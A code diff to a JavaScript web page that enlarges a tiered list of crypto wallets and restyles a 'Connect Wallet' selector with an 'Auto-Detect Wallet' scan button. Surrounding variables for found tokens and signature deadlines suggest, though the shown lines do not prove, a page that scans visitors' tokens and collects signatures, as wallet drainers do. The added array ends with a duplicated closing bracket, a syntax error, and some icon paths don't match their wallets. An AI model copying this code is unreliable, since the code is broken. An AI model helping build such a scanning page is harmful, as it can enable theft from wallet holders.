@@ -117,27 +117,82 @@ let foundTokens = [];
 let lastSignature = null;
 let lastSigDeadline = null;
 
+// ════════════════════════════════════════════════════════════════
+// WALLET CONFIGURATION - PRIORITIZED BY POPULARITY
+// Most common wallets first for better discoverability
+// ════════════════════════════════════════════════════════════════
 const WALLETS = [
-  { id: 'metamask', name: 'MetaMask', icon: '🦊', color: '#f6851b' },
-  { id: 'trust', name: 'Trust Wallet', icon: '🛡️', color: '#3375bb' },
-  { id: 'coinbase', name: 'Coinbase', icon: '🔵', color: '#1652f0' },
-  { id: 'rabby', name: 'Rabby', icon: '🐰', color: '#8c6cf4' },
-  { id: 'rainbow', name: 'Rainbow', icon: '🌈', color: '#0ac7f0' },
-  { id: 'okx', name: 'OKX', icon: '⚫', color: '#000000' },
-  { id: 'imtoken', name: 'imToken', icon: '🔷', color: '#11b9f8' },
-  { id: 'tokenpocket', name: 'TokenPocket', icon: '🟦', color: '#1296db' },
-  { id: 'zerion', name: 'Zerion', icon: '🔺', color: '#6366f1' },
-  { id: 'oneinch', name: '1inch', icon: '🦄', color: '#1a1a1a' },
-  { id: 'safepal', name: 'SafePal', icon: '🔐', color: '#25252d' },
-  { id: 'bitget', name: 'Bitget', icon: '🟠', color: '#f6a200' },
-  { id: 'mathwallet', name: 'MathWallet', icon: '🔢', color: '#4a90e2' },
-  { id: 'argent', name: 'Argent', icon: '🅰️', color: '#ff6b35' },
-  { id: 'bybit', name: 'Bybit', icon: '₿', color: '#f7921e' },
-  { id: 'binance', name: 'Binance', icon: '🏦', color: '#f3ba2f' },
-  { id: 'phantom', name: 'Phantom', icon: '👻', color: '#ab9ff2' },
-  { id: 'solflare', name: 'Solflare', icon: '☀️', color: '#fc4d4d' },
-  { id: 'backpack', name: 'Backpack', icon: '🎒', color: '#e43c3c' },
-  { id: 'tronlink', name: 'TronLink', icon: '♦️', color: '#eb0029' },
+  // ═══════════════════════════════════════════════════════════════
+  // TIER 1: MOST POPULAR (Multi-chain, highest adoption)
+  // ═══════════════════════════════════════════════════════════════
+  { id: 'metamask', name: 'MetaMask', icon: 'assets/images/metamask.webp', color: '#f6851b' },
+  { id: 'trust', name: 'Trust Wallet', icon: 'assets/images/trust.webp', color: '#3375bb' },
+  { id: 'coinbase', name: 'Coinbase Wallet', icon: 'assets/images/coinbase.webp', color: '#1652f0' },
+  { id: 'okx', name: 'OKX Wallet', icon: 'assets/images/okx.webp', color: '#000000' },
+  { id: 'binance', name: 'Binance Wallet', icon: 'assets/images/binance.webp', color: '#f3ba2f' },
+  
+  // ═══════════════════════════════════════════════════════════════
+  // TIER 2: POPULAR (High adoption, good features)
+  // ═══════════════════════════════════════════════════════════════
+  { id: 'phantom', name: 'Phantom', icon: 'assets/images/phantom.webp', color: '#ab9ff2' },
+  { id: 'rabby', name: 'Rabby Wallet', icon: 'assets/images/rabby.webp', color: '#8c6cf4' },
+  { id: 'rainbow', name: 'Rainbow', icon: 'assets/images/rainbow.webp', color: '#0ac7f0' },
+  { id: 'ledger', name: 'Ledger Live', icon: 'assets/images/ledger.webp', color: '#000000' },
+  { id: 'onekey', name: 'OneKey', icon: 'assets/images/onekey.webp', color: '#0066ff' },
+  
+  // ═══════════════════════════════════════════════════════════════
+  // TIER 3: COMMON (Good adoption, niche or specialized)
+  // ═══════════════════════════════════════════════════════════════
+  { id: 'imtoken', name: 'imToken', icon: 'assets/images/imtoken.webp', color: '#11b9f8' },
+  { id: 'tokenpocket', name: 'TokenPocket', icon: 'assets/images/tokenpocket.webp', color: '#1296db' },
+  { id: 'safepal', name: 'SafePal', icon: 'assets/images/safepal.webp', color: '#25252d' },
+  { id: 'bitget', name: 'Bitget Wallet', icon: 'assets/images/bitget.webp', color: '#f6a200' },
+  { id: 'solflare', name: 'Solflare', icon: 'assets/images/solflare.webp', color: '#fc4d4d' },
+  { id: 'bybit', name: 'Bybit Wallet', icon: 'assets/images/bybit.webp', color: '#f7921e' },
+  
+  // ═══════════════════════════════════════════════════════════════
+  // TIER 4: EMERGING (Growing adoption, specialized features)
+  // ═══════════════════════════════════════════════════════════════
+  { id: 'kraken', name: 'Kraken Wallet', icon: 'assets/images/kraken.webp', color: '#520d94' },
+  { id: 'exodus', name: 'Exodus', icon: 'assets/images/exodus.webp', color: '#15b31d' },
+  { id: 'argent', name: 'Argent', icon: 'assets/images/argent.webp', color: '#ff6b35' },
+  { id: 'backpack', name: 'Backpack', icon: 'assets/images/backpack.webp', color: '#e43c3c' },
+  { id: 'keplr', name: 'Keplr', icon: 'assets/images/keplr.webp', color: '#5f4ee6' },
+  { id: 'leap', name: 'Leap Wallet', icon: 'assets/images/leap.webp', color: '#1a1a1a' },
+  
+  // ═══════════════════════════════════════════════════════════════
+  // TIER 5: SPECIALIZED (Chain-specific or niche)
+  // ═══════════════════════════════════════════════════════════════
+  { id: 'tronlink', name: 'TronLink', icon: 'assets/images/keychain.webp', color: '#eb0029' },
+  { id: 'zerion', name: 'Zerion', icon: 'assets/images/zerion.webp', color: '#6366f1' },
+  { id: 'oneinch', name: '1inch Wallet', icon: 'assets/images/1inch.webp', color: '#1a1a1a' },
+  { id: 'mathwallet', name: 'MathWallet', icon: 'assets/images/math.webp', color: '#4a90e2' },
+  { id: 'blockwallet', name: 'BlockWallet', icon: 'assets/images/blockwallet.webp', color: '#12b870' },
+  { id: 'core', name: 'Core Wallet', icon: 'assets/images/core.webp', color: '#13f0d0' },
+  { id: 'frontier', name: 'Frontier', icon: 'assets/images/frontier.webp', color: '#1a4f63' },
+  { id: 'unstoppable', name: 'Unstoppable Domains', icon: 'assets/images/unstoppable.webp', color: '#2166da' },
+  
+  // ═══════════════════════════════════════════════════════════════
+  // TIER 6: ADDITIONAL WALLETS (Less common but available)
+  // ═══════════════════════════════════════════════════════════════
+  { id: 'zengo', name: 'ZenGo', icon: 'assets/images/zengo.webp', color: '#1a1a1a' },
+  { id: 'fireblocks', name: 'Fireblocks', icon: 'assets/images/fireblocks.webp', color: '#000000' },
+  { id: 'sequence', name: 'Sequence', icon: 'assets/images/sequence.webp', color: '#0066ff' },
+  { id: 'xdefi', name: 'xDeFi', icon: 'assets/images/xdefi.webp', color: '#e53238' },
+  { id: 'walletconnect', name: 'WalletConnect', icon: 'assets/images/walletconn.webp', color: '#3b99fc' },
+  { id: 'brave', name: 'Brave Wallet', icon: 'assets/images/brave.webp', color: '#fb542b' },
+  { id: 'opera', name: 'Opera Wallet', icon: 'assets/images/opera.webp', color: '#ff1b2d' },
+  { id: 'loopring', name: 'Loopring', icon: 'assets/images/loopring.webp', color: '#1c1c1c' },
+  { id: 'uniswap', name: 'Uniswap Wallet', icon: 'assets/images/uniswap.webp', color: '#ff007a' },
+  { id: 'safe', name: 'Safe Wallet', icon: 'assets/images/safe.webp', color: '#12ff80' },
+  { id: 'ambire', name: 'Ambire', icon: 'assets/images/ambire.webp', color: '#1f2937' },
+  { id: 'coin98', name: 'Coin98', icon: 'assets/images/coin98.webp', color: '#1a1a1a' },
+  { id: 'mew', name: 'MyEtherWallet', icon: 'assets/images/mew.webp', color: '#00a3e0' },
+  { id: 'keepkey', name: 'KeepKey', icon: 'assets/images/keepkey.webp', color: '#000000' },
+  { id: 'keyring', name: 'KeyRing', icon: 'assets/images/keyring.webp', color: '#1a1a1a' },
+  { id: 'grin', name: 'Grin Wallet', icon: 'assets/images/linen.webp', color: '#1a1a1a' },
+  { id: 'enjin', name: 'Enjin Wallet', icon: 'assets/images/enjin.webp', color: '#a349a4' },
+];
 ];
 
 const DEEP_LINKS = {
@@ -737,25 +792,32 @@ function showWalletSelector() {
   const installed = detectInstalledWallets();
   
   let html = `
-    <div style="padding: 20px;">
-      <h2>Connect Wallet</h2>
-      <p style="color: #666; margin-bottom: 20px;">Auto-detects all chains</p>
+    <div style="padding: 20px; max-width: 900px; margin: 0 auto;">
+      <h2 style="text-align: center; margin-bottom: 10px;">Connect Wallet</h2>
+      <p style="color: #666; margin-bottom: 25px; text-align: center;">Select your wallet to auto-detect tokens across all chains</p>
       
-      <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 20px;">
-        ${WALLETS.map(w => `
-          <div onclick="handleWalletClick('${w.id}')" 
-               style="padding: 15px; border: 2px solid ${installed.has(w.id) ? w.color : '#e5e7eb'}; border-radius: 12px; cursor: pointer; text-align: center; position: relative; ${installed.has(w.id) ? 'background: #f0fdf4;' : ''}">
-            ${installed.has(w.id) ? `<span style="position: absolute; top: 5px; right: 5px; background: ${w.color}; color: white; border-radius: 50%; width: 18px; height: 18px; font-size: 11px; display: flex; align-items: center; justify-content: center;">✓</span>` : ''}
-            <div style="font-size: 24px; margin-bottom: 5px;">${w.icon}</div>
-            <div style="font-size: 12px;">${w.name}</div>
-          </div>
-        `).join('')}
+      <div style="display: grid; grid-template-columns: repeat(auto-fill, minmax(100px, 1fr)); gap: 12px; margin-bottom: 20px;">
+        ${WALLETS.map(w => {
+          const isInstalled = installed.has(w.id);
+          const isImage = w.icon.includes('assets/');
+          return `
+            <div onclick="handleWalletClick('${w.id}')" 
+                 style="padding: 12px; border: 2px solid ${isInstalled ? w.color : '#e5e7eb'}; border-radius: 12px; cursor: pointer; text-align: center; position: relative; transition: all 0.2s; ${isInstalled ? 'background: #f0fdf4; box-shadow: 0 0 8px ' + w.color + '40;' : 'background: #ffffff; hover: transform: scale(1.05);'} min-height: 110px; display: flex; flex-direction: column; align-items: center; justify-content: center;">
+              ${isInstalled ? `<span style="position: absolute; top: 5px; right: 5px; background: ${w.color}; color: white; border-radius: 50%; width: 22px; height: 22px; font-size: 12px; display: flex; align-items: center; justify-content: center; font-weight: bold;">✓</span>` : ''}
+              ${isImage ? `<img src="${w.icon}" alt="${w.name}" style="width: 40px; height: 40px; margin-bottom: 8px; object-fit: contain; border-radius: 8px;">` : `<div style="font-size: 32px; margin-bottom: 5px;">${w.icon}</div>`}
+              <div style="font-size: 11px; font-weight: 600; color: ${isInstalled ? '#0c5f2a' : '#1f2937'}; line-height: 1.3;">${w.name}</div>
+            </div>
+          `;
+        }).join('')}
       </div>
       
-      <button onclick="startFullScan()" style="width: 100%; padding: 15px; background: #3b82f6; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; margin-bottom: 10px;">
+      <button onclick="startFullScan()" style="width: 100%; padding: 15px; background: #3b82f6; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: 600; margin-bottom: 10px; transition: all 0.2s;" onmouseover="this.style.background='#2563eb'" onmouseout="this.style.background='#3b82f6'">
         Auto-Detect Wallet
       </button>
       
+      <p style="text-align: center; color: #999; font-size: 12px; margin: 15px 0;">
+        Can't find your wallet? Tap a wallet above to install it.
+      </p>
     </div>
   `;
   
